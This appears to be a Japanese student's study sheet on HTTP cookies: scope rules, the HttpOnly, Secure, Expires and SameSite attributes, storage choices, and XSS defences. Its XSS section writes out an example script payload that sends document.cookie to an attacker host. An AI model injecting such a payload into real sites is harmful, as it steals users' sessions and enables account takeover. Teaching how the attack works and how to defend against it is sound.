# 課題 1

## クッキーとは

- クッキーは、ウェブサイトがユーザーのブラウザに一時的に保存する小さなテキストファイルのことを指す
- クッキーは、ウェブサイトがユーザーを識別したり、ユーザーの設定や前回の訪問情報を記憶したりするために使用される
- ユーザーがウェブサイトを訪れると、ウェブサーバーは HTTP レスポンスの一部として「Set-Cookie」ヘッダを送信する。このヘッダはクッキーの名前と値、有効期限、パス、ドメインなどの属性を含む。
- ブラウザはこの「Set-Cookie」ヘッダを受け取ると、その情報をクッキーとして保存する
- ユーザーがそのウェブサイトを再訪問するとき、ブラウザは保存したクッキーの情報を HTTP リクエストヘッダに含めてサーバーに送信する。
- これにより、サーバーはユーザーを識別したり、前回の訪問情報に基づいたカスタマイズされたコンテンツを提供したりすることができる

参考：https://developer.mozilla.org/ja/docs/Web/HTTP/Cookies

## www.hoge.comで発行されたクッキーは、www.fuga.comにも送信されるか？

- www.hoge.comで発行されたクッキーはwww.fuga.comには送信されない。これは、クッキーが「ドメイン固有」であるため。
- クッキーは、それが設定された特定のドメイン（この場合はwww.hoge.com）に対してのみ送信される
- ユーザーのプライバシーとセキュリティを保護するための重要な仕組み
- 異なるドメイン間でクッキーが共有されると、ユーザーの行動を追跡したり、個人情報を不適切に収集したりするリスクがある

## hoge.com:8080 のクッキーは hoge.com:9090 にも送信されるか？

- クッキーはドメインとパスに基づいて送信されますが、ポート番号は考慮されないため送信される

## www.hoge.comで発行されたクッキーは、www.api.hoge.comにも送信されるか？

- ドメイン属性の設定により、同一のサブドメイン（例：sub1.hoge.com と sub2.hoge.com）間で共有することが可能

## クッキーに Domain="hoge.com"を指定した場合、api.hoge.com にもクッキーは送信されるか？

- クッキーに Domain=hoge.com を指定した場合、そのクッキーは api.hoge.com にも送信される
- クッキーの Domain 属性を設定すると、そのクッキーは指定したドメインおよびそのサブドメインに対して送信される

## JavaScript からクッキーの値が取得されることを防ぐことは可能？

- ブラウザで実行される JavaScript からクッキーの値を取得されることを防ぐことは可能
- クッキーを設定する際に HttpOnly 属性を使用する
- HttpOnly 属性が設定されたクッキーは、JavaScript の Document.cookieAPI を通じてアクセスすることができない
- クロスサイトスクリプティング（XSS）攻撃によるクッキーの盗難を防ぐことが可能

## HTTPS（暗号化）通信の時だけクッキーを送信することは可能？

- HTTPS（暗号化）通信の時だけクッキーを送信することは可能
- これを実現するためには、クッキーを設定する際に Secure 属性を使用する
- Secure 属性が設定されたクッキーは、HTTPS を通じてのみ送信される
- HTTP を使用する通信では、そのクッキーは送信されない
- これによりネットワーク上でのクッキーの盗聴を防ぐことができる

## クッキーに Expires を設定した場合

- クッキーに Expires 属性を設定すると、そのクッキーの有効期限が設定される
- Expires 属性には具体的な日時（通常は GMT で表される）が設定され、その日時を過ぎるとクッキーは自動的に削除される
- Expires 属性が設定されていないクッキーは、セッションクッキーと呼ばれ、ブラウザが閉じられると自動的に削除される
- Expires 属性を設定することで、ブラウザが閉じられた後もクッキーを保持することができる
- クッキーの有効期限を長期間に設定すると、セキュリティ上のリスクを伴う可能性がある
- 例えば、攻撃者にクッキーを盗まれた場合、有効期限が長いと攻撃者がそのクッキーを使ってユーザーを偽装する時間が長くなる
- そのため、クッキーの有効期限は必要最小限に保つことが推奨される

## SameSite 属性とは

- SameSite 属性は、クッキーが送信されるコンテキストを制限するための属性で、クロスサイトリクエストフォージェリ（CSRF）攻撃を防ぐために使用される
- SameSite 属性には、Strict、Lax、None の 3 つの値を設定することができる
- SameSite=Strict
  - この設定を使用すると、クッキーは同じサイト（つまり、同じドメイン）のリクエストでしか送信されない
  - ユーザーが直接サイトを訪れた場合にのみクッキーが送信されることを意味する
- SameSite=Lax
  - この設定を使用すると、クッキーは同じサイトのリクエスト、または他のサイトからの「安全な」ナビゲーション（例えば、リンクをクリックしてサイトに移動する）で送信される
  - Strict よりも少し緩い制限で、ユーザーが他のサイトからリンクをクリックしてサイトに移動した場合でもクッキーが送信されることを意味する
- SameSite=None
  - この設定を使用すると、クッキーはすべてのコンテキストで送信される。つまり、他のサイトからのリクエストでもクッキーが送信される。
  - ただし、SameSite=None を使用する場合、Secure 属性も必ず設定する必要がある
  - クッキーが安全な接続（HTTPS）を通じてのみ送信されることを保証する

## クッキーに格納しない方が良い情報の例

クッキーはブラウザに保存され、攻撃者に盗まれる可能性があるため、下記の情報は格納しない方が良い

- パスワード
- 個人を特定できる情報
- センシティブな情報

## クッキーを使うべきタイミングと、ローカルストレージを使うべきタイミング

### クッキーを使うべきタイミング

- セッション管理：クッキーは HTTP リクエストと一緒に自動的に送信されるため、ユーザーの認証情報などのセッションデータを保存するのに適している

### ローカルストレージを使うべきタイミング

- クライアントサイドの情報：ローカルストレージは、サーバーとの通信が不要な情報、例えば一時的なユーザーの入力や、重要でない情報を保存するのに適している。
- ローカルストレージは JavaScript から直接アクセスできるため、XSS 攻撃のリスクがある
- センシティブな情報（例えば、認証情報）をローカルストレージに保存するべきではない

## Stack Overflow のような WEB 掲示板サービスを開発しているとしましょう。XSS（クロスサイトスクリプティング）により、他ユーザのクッキー情報が抜き出される仕組みを説明してください。どのような対策が考えられますか？

### 他ユーザのクッキー情報が抜き出される仕組み

- クロスサイトスクリプティング（XSS）は、攻撃者がウェブサイトに悪意のあるスクリプトを注入し、そのスクリプトが他のユーザーのブラウザで実行されるタイプの攻撃
- この攻撃により、攻撃者は他のユーザーのセッションクッキーを盗むことができ、その結果、そのユーザーとして行動することが可能になる
- 例えば、攻撃者が掲示板に <script>document.location='https://attacker.com/steal.php?cookie='+document.cookie;</script> のようなメッセージを投稿したとする
- 他のユーザーがそのページを表示すると、ブラウザはこのスクリプトを実行し、ユーザーのクッキーを攻撃者のサーバーに送信する
- これにより、攻撃者はユーザーのクッキーを取得し、そのユーザーとして行動することができる

### XSS 攻撃を防ぐための対策

- 入力のサニタイズ
  - ユーザーからの入力をそのまま表示するのではなく、特殊文字（例えば <、 >、"、'）を HTML エンティティにエスケープすることで、スクリプトの注入を防ぐ
- Content Security Policy (CSP)
  - CSP を使用すると、ウェブページがどのドメインからスクリプトを読み込むことができるかを制限することができる
  - これにより、攻撃者が意図しないスクリプトを実行するのを防ぐことができる
- HttpOnly クッキー
  - HttpOnly フラグが設定されたクッキーは、JavaScript からアクセスできないため、XSS 攻撃によるクッキーの盗難を防ぐことができる

## 課題 2（クイズ）

一部の <cookie-name> は特殊な意味を持ちますが、どんなものがあるか教えてください
参考：https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Set-Cookie
